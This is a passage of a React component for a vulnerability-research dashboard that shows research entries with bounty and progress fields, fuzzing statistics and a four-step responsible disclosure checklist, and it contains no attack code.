                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {researchEntries.map((entry, i) => (
                    <motion.div key={entry.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.05 }}
                      className="p-4 rounded-xl border border-border hover:border-secondary/40 transition-colors"
                    >
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center gap-2">
                          <code className="text-xs font-mono font-bold text-secondary">{entry.id}</code>
                          <Badge className={cn("text-[9px]",
                            entry.status === "poc-ready" ? "bg-success/15 text-success border-success/30" :
                            entry.status === "analyzing" ? "bg-warning/15 text-warning border-warning/30" :
                            entry.status === "fuzzing" ? "bg-primary/15 text-primary border-primary/30" :
                            "bg-muted text-muted-foreground"
                          )}>{entry.status}</Badge>
                        </div>
                        <span className="text-sm font-bold text-success font-mono">{entry.bounty}</span>
                      </div>
                      <h4 className="text-sm font-semibold text-foreground">{entry.target}</h4>
                      <p className="text-xs text-muted-foreground mb-3">{entry.type}</p>
                      <div className="flex items-center justify-between text-xs text-muted-foreground mb-1">
                        <span>Progress</span>
                        <span className="font-mono">{entry.progress}%</span>
                      </div>
                      <Progress value={entry.progress} className="h-1.5" />
                    </motion.div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Fuzzing Dashboard */}
              <Card className="border-border bg-card">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-base">
                    <Zap className="h-5 w-5 text-primary" />
                    Fuzzing Engine — AFL++
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 gap-3">
                    {[
                      { label: "Total Executions", value: fuzzingStats.totalExecutions.toLocaleString(), color: "text-primary" },
                      { label: "Crashes Found", value: fuzzingStats.crashesFound.toString(), color: "text-destructive" },
                      { label: "Unique Crashes", value: fuzzingStats.uniqueCrashes.toString(), color: "text-warning" },
                      { label: "Code Coverage", value: `${fuzzingStats.coverage}%`, color: "text-success" },
                      { label: "Runtime", value: fuzzingStats.runtime, color: "text-foreground" },
                      { label: "Corpus Size", value: fuzzingStats.corpusSize.toLocaleString(), color: "text-secondary" },
                    ].map((stat, i) => (
                      <div key={i} className="p-3 rounded-xl bg-muted/30 border border-border">
                        <span className="text-[10px] text-muted-foreground uppercase tracking-wider">{stat.label}</span>
                        <p className={cn("text-lg font-black font-mono mt-1", stat.color)}>{stat.value}</p>
                      </div>
                    ))}
                  </div>
                  <div className="mt-4 flex gap-2">
                    <Button size="sm" className="flex-1 gap-1.5 text-xs h-9">
                      <Play className="h-3 w-3" /> Resume Fuzzer
                    </Button>
                    <Button size="sm" variant="outline" className="gap-1.5 text-xs h-9">
                      <Download className="h-3 w-3" /> Export Crashes
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* Responsible Disclosure */}
              <Card className="border-secondary/20 bg-gradient-to-br from-secondary/5 to-card">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2 text-base">
                    <BookOpen className="h-5 w-5 text-secondary" />
                    Responsible Disclosure
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    {[
                      { step: 1, label: "Discovery & PoC", desc: "Confirm vulnerability and build minimal proof-of-concept" },
                      { step: 2, label: "Vendor Notification", desc: "Report to vendor via security@vendor.com with 90-day disclosure window" },
                      { step: 3, label: "Coordination", desc: "Work with vendor on patch development and CVE assignment" },
                      { step: 4, label: "Public Disclosure", desc: "Publish advisory after patch or after 90-day window expires" },
                    ].map(s => (
                      <div key={s.step} className="flex items-start gap-3">
                        <div className="w-7 h-7 rounded-full bg-secondary/20 flex items-center justify-center shrink-0">
                          <span className="text-xs font-bold text-secondary">{s.step}</span>
                        </div>
                        <div>
                          <h4 className="text-sm font-semibold text-foreground">{s.label}</h4>
                          <p className="text-xs text-muted-foreground">{s.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                  <Button variant="outline" className="w-full gap-2 text-xs">
                    <Shield className="h-3.5 w-3.5" />
                    Generate Disclosure Report
                  </Button>
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default CyberCommandCenter;
